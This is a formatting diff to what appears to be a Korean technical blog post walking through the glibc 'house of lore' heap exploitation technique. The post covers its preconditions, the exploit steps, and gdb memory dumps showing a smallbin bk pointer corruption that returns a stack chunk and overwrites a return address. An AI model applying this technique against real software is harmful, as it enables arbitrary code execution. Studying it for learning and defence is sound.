@@ -11,7 +11,7 @@ mermaid: true
 
 - 할당받기 원하는 영역에 fake chunk 구조를 가지고 있어야 함
 - 공격자에 의해 small, large chunk 할당과 해제가 자유로워야 함
-- 공격자에 의해 freed chunk의 bk 영역에 원하는 값을 저장할 수 있어야 함
+- 공격자에 의해 freed chunk의 `bk` 영역에 원하는 값을 저장할 수 있어야 함
 
 ## Exploit plan
 
@@ -20,7 +20,7 @@ mermaid: true
     - fake chunk 구조를 저장할 수 있는 memory 영역
 2. 다른 크기의 2개의 heap 영역 할당
 3. 첫 번째 chunk 해제
-4. 해제된 첫 번째 chunk의 bk영역에 원하는 영역의 주소 값 저장
+4. 해제된 첫 번째 chunk의 `bk`영역에 원하는 영역의 주소 값 저장
 5. 두 번째 chunk보다 큰 chunk를 할당
     - 해제된 small chunk를 small bin에 등록하기 위함
 6. 해제된 chunk와 동일한 크기의 heap을 2개 생성
@@ -133,14 +133,14 @@ int main(int argc, char * argv[]){
 }
 ```
 
-malloc으로 100만큼 할당한다. victim(0x804c000)
+`malloc()`으로 100만큼 할당한다. victim(0x804c000)
 
 ```
 gdb-peda$ x/24wx 0x804c000
 0x804c000:  0x00000000  0x00000069  0x00000000  0x00000000
 ```
 
-stack 영역에 fake chunk를 만들기 위한 buffer를 확인한다.
+stack 영역에 `fake chunk`를 만들기 위한 buffer를 확인한다.
 
 ```
 stack_buffer_1 at 0xffffd58c
@@ -150,7 +150,7 @@ Set the fwd pointer to the victim_chunk in order to bypass the check of small bi
 Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 in order to bypass the check of small bin corruptedin last malloc, which returning pointer to the fake chunk on stack
 ```
 
-p5에 malloc으로 1000만큼 할당한다. free 시 top chunk와 병합되지 않도록 large chunk를 만든다.
+`p5`에 `malloc()`으로 1000만큼 할당한다. `free()` 시 top chunk와 병합되지 않도록 large chunk를 만든다.
 
 ```
 Allocating another large chunk in order to avoid consolidating the top chunk withthe small one during the free()
@@ -158,7 +158,7 @@ Allocated the large chunk on the heap at 0x804c070
 Freeing the chunk 0x804c008, it will be inserted in the unsorted bin
 ```
 
-victim을 free 한 후의 heapinfo. unsortbin에 victim이 들어간 것을 확인할 수 있다.
+victim을 `free()` 한 후의 `heapinfo.unsortbin`에 victim이 들어간 것을 확인할 수 있다.
 
 ```
 gdb-peda$ heapinfo
@@ -177,7 +177,7 @@ gdb-peda$ heapinfo
             unsortbin: 0x804c000 (size : 0x68)
 ```
 
-unsortbin victim’s fwd와 bk는 nil이라고 하는데 값이 존재했다. 어차피 덮어씌워지는거라 그냥 진행했다.
+unsortbin victim’s `fwd`와 `bk`는 nil이라 하는데 값이 존재했다. 어차피 덮어씌워지는거라 그냥 진행했다.
 
 ```
 In the unsorted bin the victim's fwd and bk pointers are nil
@@ -185,7 +185,7 @@ victim->fwd: 0xf7fb67b0
 victim->bk: 0xf7fb67b0
 ```
 
-p2에 1200만큼 malloc 후 heapinfo. smallbin에 victim이 삽입되었다.
+`p2`에 1200만큼 `malloc()` 후 `heapinfo.smallbin`에 victim이 삽입되었다.
 
 ```
 gdb-peda$ heapinfo
@@ -213,7 +213,7 @@ victim->bk: 0xf7fb6810
 Now emulating a vulnerability that can overwrite the victim->bk pointer
 ```
 
-victim을 다시 한 번 free하여 bk 영역에 stack_buffer_1으로 변조한다.
+victim을 다시 한 번 `free()`하여 `bk` 영역에 `stack_buffer_1`으로 변조한다.
 
 ```
 gdb-peda$ x/24wx 0x804c000
@@ -241,7 +241,7 @@ gdb-peda$ x/24wx 0x804c000
         -------------------------------------------
 ```
 
-victim과 똑같은 size로 malloc한다.
+victim과 똑같은 size로 `malloc()`한다.
 
 ```
 Now allocating a chunk with size equal to the first one freed
@@ -255,7 +255,7 @@ gdb-peda$ x/24wx 0x804c000
 0x804c000:  0x00000000  0x00000069  0xf7fb6810  0xffffd58c
 ```
 
-다시 한 번 똑같은 size로 malloc할 경우 Stack의 공간(0xffffd594)이 할당된다. jackot의 주소를 변수에 저장 후 p4 + 40 위치에 memcpy할 경우 return address가 변조되어 jackpot이 실행된다.
+다시 한 번 똑같은 size로 `malloc()`할 경우 Stack의 공간(0xffffd594)이 할당된다. jackot의 주소를 변수에 저장 후 `p4 + 40` 위치에 `memcpy()`할 경우 return address가 변조되어 jackpot이 실행된다.
 
 ```
 This last malloc should trick the glibc malloc to return a chunk at the position injected in bin->bk
